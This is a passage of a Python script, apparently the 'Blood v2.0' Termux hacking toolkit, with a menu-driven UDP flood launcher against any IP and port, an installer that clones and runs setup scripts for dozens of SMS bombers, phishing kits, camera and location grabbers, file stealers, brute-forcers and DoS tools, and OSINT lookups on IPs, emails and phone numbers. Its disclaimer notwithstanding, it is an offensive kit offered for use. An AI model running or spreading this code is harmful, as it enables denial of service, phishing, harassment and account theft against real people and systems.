            print(f"{R}[!] WARNING: Layer 4 attacks are highly aggressive.{D}")
            target = input(f"{W}Target IP: {W}").strip()
            if not target:
                print(f"{R}[!] IP cannot be empty.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            try:
                port = int(input(f"{W}Target port (e.g., 53, 80, 443): {W}") or "53")
                duration = int(input(f"{W}Attack duration (seconds): {W}") or "30")
                if not (1 <= port <= 65535):
                    port = 53
                if duration < 5:
                    duration = 5
            except ValueError:
                port, duration = 53, 30
            try:
                socket.inet_aton(target)
            except socket.error:
                print(f"{R}[!] Invalid IP.{D}")
                input(f"\n{C}Press ENTER...")
                continue
            udp_flood(target, port, duration)
        elif choice == '95':
            break
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.{D}")
            time.sleep(1)
# ======================
# 🔑 PASSWORD GENERATOR
# ======================
def gen_password():
    try:
        length = int(input(f"{W}Length: {W}"))
        count = int(input(f"{W}Count: {W}"))
    except ValueError:
        print(f"{R}[!] Numbers only.")
        input(f"\n{C}Press ENTER...")
        return
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    print(f"\n{G}Passwords:")
    for _ in range(count):
        pwd = ''.join(random.choice(chars) for _ in range(length))
        print(f"{W}{pwd}")
    input(f"\n{C}Press ENTER...")
# ======================
# 🛠️ TOOL INSTALLER
# ======================
TOOL_FUNCTIONS = {}
def create_tool_func(name_desc, clone_url, post_cmd=None):
    clean_name = name_desc.split(' ====>')[0].strip()
    def install_func():
        clear()
        banner()
        print(f"\n{Y}[*] Installing {clean_name}...")
        os.system("apt update -y")
        if clean_name in ['TBomb'] and post_cmd:
            os.system(post_cmd)
        else:
            os.system("apt install git -y")
            if clone_url and clone_url.strip():
                home_dir = os.environ['HOME']
                os.system(f"git clone {clone_url.strip()} {home_dir}/{clean_name}")
            if post_cmd and post_cmd.strip():
                home_dir = os.environ['HOME']
                os.system(f"cd {home_dir}/{clean_name} && {post_cmd.strip()}")
        print(f"\n{G}[+] {clean_name} installed successfully in ~/")
        input(f"\n{C}Press ENTER...")
    return install_func
tools_list = [
    ("007-TheBond ====> 📱 WhatsApp & SMS bomber", "https://github.com/Deadshot0x7/007-TheBond.git", "bash run_007-TheBond.sh"),
    ("AllHackingTools ====> 🧰 All-in-one hacking toolkit", "https://github.com/mishakorzik/AllHackingTools.git", "bash Install.sh && bash fix.sh"),
    ("Asura ====> 🕵️ Advanced OSINT & info gathering", "https://github.com/princekrvert/Asura.git", "./install.sh"),
    ("B4Bomber ====> 📨 SMS bomber (Indonesia-focused)", "https://github.com/mahendraplus/B4Bomber.git", "cd Termux && bash install.sh"),
    ("BannerX ====> 🎨 Custom ASCII banner generator", "https://github.com/MrHacker-X/BannerX.git", ""),
    ("Beast_Bomber ====> 💣 Multi-service SMS/email bomber", "https://github.com/ebankoff/Beast_Bomber.git", "pip3 install -r requirements.txt"),
    ("BruteX ====> 🔓 SSH & service brute-force scanner", "https://github.com/1N3/BruteX.git", "./install"),
    ("CAM-DUMPER ====> 📸 Camera phishing toolkit", "https://github.com/LiNuX-Mallu/CAM-DUMPER.git", ""),
    ("CloneWeb ====> 🌐 Clone websites for phishing", "https://github.com/MrHacker-X/CloneWeb.git", "bash setup.sh"),
    ("Cracker-Tool ====> 🔑 Password & hash cracker suite", "https://github.com/cr4shcod3/Cracker-Tool.git", ""),
    ("DarkFly ====> 🕷️ Ethical hacking & pentesting suite", "https://github.com/Ranginang67/DarkFly-Tool.git", "python3 install.py install"),
    ("DefGen ====> 🛡️ Payload & shellcode generator", "https://github.com/Err0r-ICA/DefGen.git", ""),
    ("DirAttack ====> 📁 Directory & file brute-forcer", "https://github.com/Ranginang67/DirAttack.git", "python3 install.py"),
    ("Gmail-Hack ====> 📧 Gmail account checker/phisher", "https://github.com/mishakorzik/Gmail-Hack.git", "bash install.sh"),
    ("Hacked ====> 💀 Custom hacking-themed scripts", "https://github.com/MrHacker-X/Hacked.git", ""),
    ("Hammer ====> 🌪️ DDoS stress testing tool", "https://github.com/codingplanets/Hammer.git", ""),
    ("InstaReport ====> 📸 Instagram report spammer", "https://github.com/Crevils/InstaReport.git", "bash setup.sh"),
    ("IP_Rover ====> 🌍 IP & location tracker", "https://github.com/Cyber-Dioxide/IP_Rover.git", "pip3 install -r requirements.txt"),
    ("kalimux ====> 💉 Kali Linux-style Termux theme", "https://github.com/noob-hackers/kalimux.git", ""),
    ("LordPhish ====> 🎭 Advanced phishing page generator", "https://github.com/Black-Hell-Team/LordPhish.git", "bash setup.sh"),
    ("Lucifer ====> 🔥 Multi-purpose phishing & recon tool", "https://github.com/rixon-cochi/Lucifer.git", "bash setup.sh"),
    ("maskphish ====> 🔗 URL masking for phishing", "https://github.com/jaykali/maskphish.git", ""),
    ("Mega-File-Stealer ====> 📁 Steal files via phishing link", "https://github.com/ZechBron/Mega-File-Stealer.git", "bash setup.sh"),
    ("Metasploit ====> 💥 Full Metasploit Framework for Termux", "https://github.com/gushmazuko/metasploit_in_termux.git", "bash metasploit.sh"),
    ("mrphish ====> 🎣 Camera & location phishing", "https://github.com/noob-hackers/mrphish.git", "bash setup.sh"),
    ("MyServer ====> 🖥️ Localhost server & tunneling tool", "https://github.com/rajkumardusad/MyServer.git", "bash install"),
    ("nikto ====> 🕵️ Web server vulnerability scanner", "https://github.com/sullo/nikto.git", ""),
    ("nmap ====> 🌐 Network mapper & port scanner", "", "pkg install nmap -y"),
    ("onex ====> 🧪 All-in-one penetration toolkit", "https://github.com/jackind424/onex.git", "sh install"),
    ("Osintgram ====> 📸 Instagram OSINT tool", "https://github.com/Datalux/Osintgram.git", "pip3 install -r requirements.txt"),
    ("Pureblood ====> 🧬 Forensics, recon & exploitation suite", "https://github.com/cr4shcod3/pureblood.git", "pip3 install -r requirements.txt"),
    ("Pycompile ====> 🔒 Python script obfuscator & compiler", "https://github.com/htr-tech/Pycompile.git", ""),
    ("RED_HAWK ====> 🔍 Web recon & vulnerability scanner", "https://github.com/Tuhinshubhra/RED_HAWK.git", ""),
    ("saycheese ====> 📸 Grab front camera photo via link", "https://github.com/thelinuxchoice/saycheese.git", ""),
    ("ScannerX ====> 🔎 Network & service scanner", "https://github.com/MrHacker-X/ScannerX.git", "./setup.sh"),
    ("seeker ====> 📍 Accurate geolocation via phishing", "https://github.com/thewhiteh4t/seeker.git", ""),
    ("seeu ====> 👁️ Real-time location & device info grabber", "https://github.com/noob-hackers/seeu.git", ""),
    ("slowloris ====> 🐌 Low-bandwidth DoS attack tool", "https://github.com/gkbrk/slowloris.git", ""),
    ("SocialBox-Termux ====> 🧨 Social media brute-force toolkit", "https://github.com/samsesh/SocialBox-Termux.git", "./install-sb.sh"),
    ("SploitX ====> 💣 Exploit & payload generator", "https://github.com/MrHacker-X/SploitX.git", "bash setup.sh"),
    ("sqlmap ====> 🧪 Automatic SQL injection & DB takeover", "https://github.com/sqlmapproject/sqlmap.git", ""),
    ("TBomb ====> 📞 Powerful SMS/Call bomber", "", "pip3 install tbomb"),
    ("termux-key ====> ⌨️ Add extra keys to Termux keyboard", "https://github.com/htr-tech/termux-key.git", ""),
    ("tstyle ====> 🎨 Customize Termux UI/theme", "https://github.com/htr-tech/tstyle.git", "bash setup.sh"),
    ("userfinder ====> 🔍 Find usernames across platforms", "https://github.com/machine1337/userfinder.git", ""),
    ("websploit ====> 🧰 Web-based exploitation framework", "https://github.com/f4rih/websploit.git", "pip3 install -r requirements.txt && python3 setup.py install"),
    ("zphisher ====> 🎭 Automated phishing toolkit (80+ templates)", "https://github.com/htr-tech/zphisher.git", ""),
]
for i, (name_desc, clone_url, post_cmd) in enumerate(tools_list, 1):
    key_str = str(i).zfill(2)
    TOOL_FUNCTIONS[key_str] = create_tool_func(name_desc, clone_url, post_cmd)
    TOOL_FUNCTIONS[str(i)] = TOOL_FUNCTIONS[key_str]
def tool_installer():
    while True:
        clear()
        banner()
        print(f"\n{G}🔧 Tool Installer – Select tools to install:\n")
        for i, (name_desc, _, _) in enumerate(tools_list, 1):
            print(f"{G}[{str(i).zfill(2)}]{W} {name_desc}")
        print(f"\n{G}[95]{W} Back")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select tool number (1-{len(tools_list)}): {W}").strip()
        if choice in TOOL_FUNCTIONS:
            TOOL_FUNCTIONS[choice]()
        elif choice == '95':
            break
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.")
            time.sleep(1)
# ======================
# 📞 CONNECT & ABOUT
# ======================
def connect_us():
    print(f"\n{Y}🔗 CONNECT WITH MR.X{D}")
    print(f"{G}{'─' * 45}{D}")
    print(f"{C}Website    {W}: {G}https://whomrx.pages.dev{D}")
    print(f"{C}Market     {W}: {G}https://whomrx-market.pages.dev{D}")
    print(f"{C}Bot        {W}: {G}https://whomrx-bot.netlify.app{D}")
    print(f"{C}Blog       {W}: {G}https://whomrxhackers.blogspot.com{D}")
    print(f"{C}GitHub     {W}: {G}https://github.com/Whomrx666{D}")
    print(f"{G}{'─' * 45}{D}")
    input(f"\n{C}Press ENTER to return...")
def about():
    print(f"\n{Y}Blood v2.0 – Real Cyber Toolkit")
    print(f"{W}Built for: education, bug bounty, and authorized testing.")
    print(f"{R}⚠️  Illegal use is prohibited.")
    input(f"\n{C}Press ENTER...")
# ======================
# 🧠 MAIN MENU
# ======================
def main():
    while True:
        banner()
        print(f"\n{G}[01]{W} Information Gathering")
        print(f"{G}[02]{W} Web Scraping")
        print(f"{G}[03]{W} Hash Cracking + Analysis")
        print(f"{G}[04]{W} Document Bruteforce (ZIP/PDF)")
        print(f"{G}[05]{W} DDoS Attack")
        print(f"{G}[06]{W} Password Generator")
        print(f"{G}[07]{W} Tool Installer")
        print(f"{G}[08]{W} Connect With US")
        print(f"{G}[09]{W} About")
        print(f"{G}[10]{W} Mini Games")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select: {W}")
        if choice == '1':
            info_gathering()
        elif choice == '2':
            web_scraping()
        elif choice == '3':
            hash_cracking()
        elif choice == '4':
            document_bruteforce()
        elif choice == '5':
            ddos_attack()
        elif choice == '6':
            gen_password()
        elif choice == '7':
            tool_installer()
        elif choice == '8':
            connect_us()
        elif choice == '9':
            about()
        elif choice == '10':
            mini_games()
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.")
            time.sleep(1)
# ======================
# 📡 INFORMATION GATHERING MENU
# ======================
def info_gathering():
    while True:
        banner()
        print(f"\n{G}[01]{W} Track by IP Address")
        print(f"{G}[02]{W} Analyze Email Address")
        print(f"{G}[03]{W} Analyze Phone Number")
        print(f"{G}[04]{W} Scan Username (50+ Platforms)")
        print(f"{G}[05]{W} Domain Intelligence")
        print(f"{G}[06]{W} Track IP by Domain")
        print(f"{G}[95]{W} Back")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select: {W}")
        if choice == '1':
            ip = input(f"{W}IP: {W}").strip()
            if ip: trace_ip(ip)
        elif choice == '2':
            email = input(f"{W}Email: {W}").strip()
            if email: analyze_email(email)
        elif choice == '3':
            phone = input(f"{W}Phone (+62...): {W}").strip()
            if phone: analyze_phone(phone)
        elif choice == '4':
            username = input(f"{W}Username: {W}").strip()
            if username: scan_username(username)
        elif choice == '5':
            domain = input(f"{W}Domain: {W}").strip()
            if domain: domain_intel(domain)
        elif choice == '6':
            domain = input(f"{W}Domain: {W}").strip()
            if domain: ip_by_domain(domain)
        elif choice == '95':
            break
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.")
            time.sleep(1)
# ======================
# 🚀 RUN
# ======================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit_tool()